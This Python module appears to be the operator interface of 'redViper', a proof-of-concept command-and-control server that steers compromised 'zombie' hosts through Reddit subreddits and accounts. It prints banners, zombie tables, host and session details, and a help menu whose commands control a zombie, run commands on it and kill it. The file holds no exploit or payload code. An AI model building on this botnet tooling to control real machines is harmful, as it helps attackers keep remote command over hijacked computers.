#!/usr/bin/env python3
from datetime import datetime
import tabulate
import globals

# Color Codes
RESET = "\033[0m"                                            
RED = "\033[0;31m"                                                       
RED_B = "\033[1;31m"
GREEN = "\033[0;32m"                                
GREEN_B = "\033[1;32m"                                                     
YELLOW = "\033[0;33m"                                                      
YELLOW_B = "\033[1;33m"                                                        
BLUE = "\033[0;34m"                                                              
BLUE_B = "\033[1;34m"
PURPLE = "\033[0;35m"                                                      
PURPLE_B = "\033[1;35m"                                                    
CYAN = "\033[0;36m"                                                            
CYAN_B = "\033[1;36m"                                                            
WHITE = "\033[0;37m"
WHITE_B = "\033[1;37m"    

# Status Indicators
GREEN_PLUS = GREEN_B + "[+]"  + RESET
RED_MINUS = RED_B + "[-]" + RESET
BLUE_QUESTION = BLUE_B + "[?]" + RESET
YELLOW_EX = YELLOW_B + "[!]" + RESET

def printBanner():
	asciiArt = ( RED_B +
"                      ._______   ____.__						\n" 
"   _______   ____   __| _/\   \ /   /|__|_____   ___________  \n" 
"   \_  __ \_/ __ \ / __ |  \   Y   / |  \____ \_/ __ \_  __ \ \n" 
"    |  | \/\  ___// /_/ |   \     /  |  |  |_> >  ___/|  | \/ \n" 
"    |__|    \___  >____ |    \___/   |__|   __/ \___  >__|    \n" 
"                \/     \/               |__|        \/        \n" +
	RESET)


	infoBlock = "\t\t    " + WHITE_B + "Created By: " + RESET + "kindredsec\n"
	infoBlock += "\t\thttps://twitter.com/kindredsec\n"
	infoBlock += "\t\thttps://github.com/itsKindred\n"
	infoBlock += "\t\t   https://kindredsec.com\n"
	
	print(" ")
	print(asciiArt)
	print(infoBlock)


def buildPrompt(zombieCount, listenCount, level, vid):

	if listenCount == 0:	
		prompt = f"[{RED_B}{listenCount} listeners{RESET}]"

	elif listenCount == 1:
		prompt = f"[{YELLOW_B}{listenCount} listener{RESET}]"

	else:
		prompt = f"[{YELLOW_B}{listenCount} listeners{RESET}]"

	
	if zombieCount == 0:
		prompt += f"[{RED_B}{zombieCount} zombies{RESET}]"

	elif zombieCount == 1:
		prompt += f"[{GREEN_B}{zombieCount} zombie{RESET}]"
	else:
		prompt += f"[{GREEN_B}{zombieCount} zombies{RESET}]"


	if level == "main":
		prompt += "> "

	elif level == "command":

		vidDisplay = vid.split("-")[0][1:]
		prompt += f"[{RED}{vidDisplay}{RESET}]> "

	return prompt

def notif_green():
	string = f"{GREEN_PLUS} [{str(datetime.now()).split('.')[0]}]:"
	return string

def notif_yellow():
	string = f"{YELLOW_EX} [{str(datetime.now()).split('.')[0]}]:"
	return string

def printZombies(zombieList):

	headers = [ f"{RED}ID{RESET}", f"{RED}Zombie ID{RESET}", f"{RED}Subreddit{RESET}", f"{RED}Public IP{RESET}", f"{RED}Last Callback{RESET}" ]
	print(" ")
	print(tabulate.tabulate(zombieList, headers = headers, tablefmt="fancy_grid"))
	print(" ")

def printHelpMenu():

	print("")
	print("-------------------------------------------------------")
	print(f"{WHITE_B}   Core Commands{RESET}")
	print("-------------------------------------------------------")
	print("")
	headers = [ f"{RED}Command{RESET}", f"{RED}Description{RESET}", f"{RED}Aliases{RESET}" ]

	# there's definitely a better way to scale this, but I don't mind this way for the PoC.
	exitInfo = [ f"{WHITE_B}exit{RESET}", "terminate the redViper server", globals.EXIT_COMMANDS ]
	listInfo = [ f"{WHITE_B}list{RESET}", "display a list of all zombies that have called.", globals.LIST_COMMANDS ]
	controlInfo = [ f"{WHITE_B}control{RESET} *db_id*", "take 'control' of one of your zombies.", globals.CONTROL_COMMANDS ]
	helpInfo = [ f"{WHITE_B}help{RESET}", "display this help menu.", globals.HELP_COMMANDS ]
	fullList = ( exitInfo, listInfo, controlInfo, helpInfo )
	print(tabulate.tabulate(fullList, headers = headers, tablefmt="fancy_grid"))
	

	print("")
	print("-------------------------------------------------------")
	print(f"{WHITE_B}   Control Commands{RESET}")
	print("-------------------------------------------------------")
	print("")
	headers = [ f"{RED}Command{RESET}", f"{RED}Description{RESET}", f"{RED}Aliases{RESET}" ]

	cmdInfo = [ f"{WHITE_B}execute{RESET} *command*", "execute a command on a controlled zombie.", globals.CMD_COMMANDS ]
	backInfo = [ f"{WHITE_B}back{RESET}", "return to 'main' mode.", globals.BACK_COMMANDS ]
	infoInfo = [ f"{WHITE_B}info{RESET}", "obtained detailed information on the currently controlled zombie.", globals.INFO_COMMANDS ]
	killInfo = [ f"{WHITE_B}kill{RESET}", "terminate the currently controlled zombie.", globals.KILL_COMMANDS ]
	fullList = ( cmdInfo, backInfo, infoInfo, killInfo )
	print(tabulate.tabulate(fullList, headers = headers, tablefmt="fancy_grid"))
	print("")
	print(f"{WHITE_B}NOTE:{RESET} Current feature set of this PoC is purposely limited. Functionality will be added based on community interest.")
	print("")
	
	




def printZombieDataPretty(zombieData):
	print("")
	print("-------------------------------------------------------")
	print(f"{GREEN_B}   Session Information{RESET}")
	print("-------------------------------------------------------")
	print("")
	print(f"{WHITE_B}Database ID: {RESET}{zombieData[0]}")
	print(f"{WHITE_B}Zombie ID: {RESET}{zombieData[1]}")
	print(f"{WHITE_B}Operational Implant ID: {RESET}{zombieData[5]}")
	print(f"{WHITE_B}Operational Subreddit: {RESET}{zombieData[2]}")
	print(f"{WHITE_B}Operational Reddit Account: {RESET}{zombieData[3]}")
	print(f"{WHITE_B}Current Session Key: {RESET}{zombieData[4]}")
	print(f"{WHITE_B}Initial Check-in Time: {RESET}{zombieData[10]}")
	print(f"{WHITE_B}Most Recent Check-in Time: {RESET}{zombieData[11]}")
	print("")
	print("-------------------------------------------------------")
	print(f"{GREEN_B}   Host Information{RESET}")
	print("-------------------------------------------------------")
	print("")
	print(f"{WHITE_B}Hostname: {RESET}{zombieData[6]}")
	print(f"{WHITE_B}Public IP: {RESET}{zombieData[7]}")
	print(f"{WHITE_B}Private IP: {RESET}{zombieData[8]} (NOTE: POSSIBLY INACCURATE)")
	print(f"{WHITE_B}Platform: {RESET}{zombieData[9]}")
	print("")









	

	


